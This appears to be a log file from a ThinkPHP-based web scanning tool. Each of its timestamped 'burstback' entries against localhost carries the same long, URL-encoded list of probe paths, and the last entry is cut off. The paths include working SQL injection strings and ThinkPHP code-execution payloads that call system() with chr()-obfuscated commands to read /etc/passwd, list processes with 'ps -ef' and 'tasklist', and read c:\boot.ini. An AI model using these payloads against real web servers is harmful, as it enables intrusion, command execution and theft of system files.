+2015-12-07 16:26:00    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1%22%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyids%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyid%7E%0A/index.php/Index/index/name%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7Ds%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7D%7E%0A/index.php/admin/%0A/index.php/admin/authentication/sa%0A/index.php/admin/authentication/sa/login%0A/index.php/admin/authentication/sa/logins%0A/index.php/admin/authentication/sa/login%7E%0A/index.php/admin/authentication/sa/notexist_path%0A/index.php/admin/authentication/sa/notexist_paths%0A/index.php/admin/authentication/sa/notexist_path%7E%0A/index.php/admin/s%0A/index.php/admin/%7E%0A/index.php/ajax/api/reputation%0A/index.php/ajax/api/reputation/vote/%0A/index.php/ajax/api/reputation/vote/s%0A/index.php/ajax/api/reputation/vote/%7E%0A/index.php/api%0A/index.php/api/xmlrpc%0A/index.php/api/xmlrpcs%0A/index.php/api/xmlrpc%7E%0A/index.php/cms%0A/index.php/cms/item-comment%0A/index.php/cms/item-comments%0A/index.php/cms/item-comment%7E%0A/index.php/list-10%2520UNION/%2A%2A/all/%2A%2A/SELECT/%2A%2A%0A/index.php/module/action/param1%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/product%0A/index.php/product/list%0A/index.php/product/lists%0A/index.php/product/list%7E%0A/index.php/tools-staticPage.html%0A/index.php/tools-staticPage.htmls%0A/index.php/tools-staticPage.html%7E%0A/index.php/weblinks-categories%0A/index.php/weblinks-categoriess%0A/index.php/weblinks-categories%7E%0A  
+2015-12-07 16:26:22    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1%22%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyids%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyid%7E%0A/index.php/Index/index/name%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7Ds%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7D%7E%0A/index.php/admin/%0A/index.php/admin/authentication/sa%0A/index.php/admin/authentication/sa/login%0A/index.php/admin/authentication/sa/logins%0A/index.php/admin/authentication/sa/login%7E%0A/index.php/admin/authentication/sa/notexist_path%0A/index.php/admin/authentication/sa/notexist_paths%0A/index.php/admin/authentication/sa/notexist_path%7E%0A/index.php/admin/s%0A/index.php/admin/%7E%0A/index.php/ajax/api/reputation%0A/index.php/ajax/api/reputation/vote/%0A/index.php/ajax/api/reputation/vote/s%0A/index.php/ajax/api/reputation/vote/%7E%0A/index.php/api%0A/index.php/api/xmlrpc%0A/index.php/api/xmlrpcs%0A/index.php/api/xmlrpc%7E%0A/index.php/cms%0A/index.php/cms/item-comment%0A/index.php/cms/item-comments%0A/index.php/cms/item-comment%7E%0A/index.php/list-10%2520UNION/%2A%2A/all/%2A%2A/SELECT/%2A%2A%0A/index.php/module/action/param1%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/product%0A/index.php/product/list%0A/index.php/product/lists%0A/index.php/product/list%7E%0A/index.php/tools-staticPage.html%0A/index.php/tools-staticPage.htmls%0A/index.php/tools-staticPage.html%7E%0A/index.php/weblinks-categories%0A/index.php/weblinks-categoriess%0A/index.php/weblinks-categories%7E%0A  
+2015-12-07 16:27:09    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1%22%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyids%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyid%7E%0A/index.php/Index/index/name%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7Ds%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7D%7E%0A/index.php/admin/%0A/index.php/admin/authentication/sa%0A/index.php/admin/authentication/sa/login%0A/index.php/admin/authentication/sa/logins%0A/index.php/admin/authentication/sa/login%7E%0A/index.php/admin/authentication/sa/notexist_path%0A/index.php/admin/authentication/sa/notexist_paths%0A/index.php/admin/authentication/sa/notexist_path%7E%0A/index.php/admin/s%0A/index.php/admin/%7E%0A/index.php/ajax/api/reputation%0A/index.php/ajax/api/reputation/vote/%0A/index.php/ajax/api/reputation/vote/s%0A/index.php/ajax/api/reputation/vote/%7E%0A/index.php/api%0A/index.php/api/xmlrpc%0A/index.php/api/xmlrpcs%0A/index.php/api/xmlrpc%7E%0A/index.php/cms%0A/index.php/cms/item-comment%0A/index.php/cms/item-comments%0A/index.php/cms/item-comment%7E%0A/index.php/list-10%2520UNION/%2A%2A/all/%2A%2A/SELECT/%2A%2A%0A/index.php/module/action/param1%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/product%0A/index.php/product/list%0A/index.php/product/lists%0A/index.php/product/list%7E%0A/index.php/tools-staticPage.html%0A/index.php/tools-staticPage.htmls%0A/index.php/tools-staticPage.html%7E%0A/index.php/weblinks-categories%0A/index.php/weblinks-categoriess%0A/index.php/weblinks-categories%7E%0A  
+2015-12-07 16:31:21    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1%22%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyids%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyid%7E%0A/index.php/Index/index/name%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7Ds%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7D%7E%0A/index.php/admin/%0A/index.php/admin/authentication/sa%0A/index.php/admin/authentication/sa/login%0A/index.php/admin/authentication/sa/logins%0A/index.php/admin/authentication/sa/login%7E%0A/index.php/admin/authentication/sa/notexist_path%0A/index.php/admin/authentication/sa/notexist_paths%0A/index.php/admin/authentication/sa/notexist_path%7E%0A/index.php/admin/s%0A/index.php/admin/%7E%0A/index.php/ajax/api/reputation%0A/index.php/ajax/api/reputation/vote/%0A/index.php/ajax/api/reputation/vote/s%0A/index.php/ajax/api/reputation/vote/%7E%0A/index.php/api%0A/index.php/api/xmlrpc%0A/index.php/api/xmlrpcs%0A/index.php/api/xmlrpc%7E%0A/index.php/cms%0A/index.php/cms/item-comment%0A/index.php/cms/item-comments%0A/index.php/cms/item-comment%7E%0A/index.php/list-10%2520UNION/%2A%2A/all/%2A%2A/SELECT/%2A%2A%0A/index.php/module/action/param1%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/product%0A/index.php/product/list%0A/index.php/product/lists%0A/index.php/product/list%7E%0A/index.php/tools-staticPage.html%0A/index.php/tools-staticPage.htmls%0A/index.php/tools-staticPage.html%7E%0A/index.php/weblinks-categories%0A/index.php/weblinks-categoriess%0A/index.php/weblinks-categories%7E%0A  
+2015-12-07 16:33:39    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1%22%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyids%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyid%7E%0A/index.php/Index/index/name%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7Ds%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7D%7E%0A/index.php/admin/%0A/index.php/admin/authentication/sa%0A/index.php/admin/authentication/sa/login%0A/index.php/admin/authentication/sa/logins%0A/index.php/admin/authentication/sa/login%7E%0A/index.php/admin/authentication/sa/notexist_path%0A/index.php/admin/authentication/sa/notexist_paths%0A/index.php/admin/authentication/sa/notexist_path%7E%0A/index.php/admin/s%0A/index.php/admin/%7E%0A/index.php/ajax/api/reputation%0A/index.php/ajax/api/reputation/vote/%0A/index.php/ajax/api/reputation/vote/s%0A/index.php/ajax/api/reputation/vote/%7E%0A/index.php/api%0A/index.php/api/xmlrpc%0A/index.php/api/xmlrpcs%0A/index.php/api/xmlrpc%7E%0A/index.php/cms%0A/index.php/cms/item-comment%0A/index.php/cms/item-comments%0A/index.php/cms/item-comment%7E%0A/index.php/list-10%2520UNION/%2A%2A/all/%2A%2A/SELECT/%2A%2A%0A/index.php/module/action/param1%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D